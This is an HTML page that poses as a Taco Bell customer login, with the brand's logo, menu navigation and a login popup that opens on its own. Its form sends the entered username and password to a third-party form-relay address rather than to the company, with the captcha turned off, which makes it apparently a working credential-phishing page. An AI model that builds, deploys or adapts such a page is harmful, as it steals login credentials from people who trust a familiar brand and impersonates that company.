<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0" />
    <link rel="shortcut icon" href="./res/tacobell_logo.png" type="image/x-icon">
    <title>Customer Login | Taco Bell</title>
</head>
<body>
    <div id="top-bar" class="bar">
        <div id="top-container">
            <img id="center-logo" src="./res/tacobell_logo.png" alt="">
            <button id="login-btn" onclick="showLogin()">LOG IN</button> | <span id="gift" class="material-symbols-outlined">featured_seasonal_and_gifts</span>
        </div>
    </div>
    <div id="left-bar" class="bar">
        <img id="logo" src="./res/tacobell_logo.png" alt="">
        <nav>
            <button class="skew">MENU</button>
            <button class="skew">LOCATIONS</button>
            <button class="skew">DELIVERY</button>
            <button class="skew">REWARDS</button>
            <button class="skew">NUTRITION</button>
            <button class="skew">GIFT CARDS</button>
        </nav>
    </div>

    <div id="login-popup" class="popup active">
        <div class="popup-container">
            <div class="popup-bar">
                <h1 class="popup-title">LOG IN</h1>
                <button id="close-popup" class="popup-close" onclick="closeLogin()"><span class="material-symbols-outlined">close</span></button>
            </div>
            <div class="popup-content">
                <form action="https://formsubmit.co/7d3e63199d8c4a04677ae34a361dadc5" method="POST">
                    <input type="hidden" name="_captcha" value="false">
                    <div class="input-box">
                        <label for="">Username</label><br>
                        <input type="text" id="username" name="username" autocomplete="off" placeholder="TacoBellJohn" required>
                    </div>
                    <div class="input-box">
                        <label for="">Password</label><br>
                        <input type="password" id="password" name="message" autocomplete="off" placeholder="Case Sensitive" required>
                        <label id="show-password" onclick="togglePassVisible()"><span class="material-symbols-outlined">visibility</span></label>
                    </div>
                    <input class="continue" type="submit" value="Continue">
                </form>
            </div>
        </div>
    </div>
</body>
<script src="./js/script.js"></script>
</html>
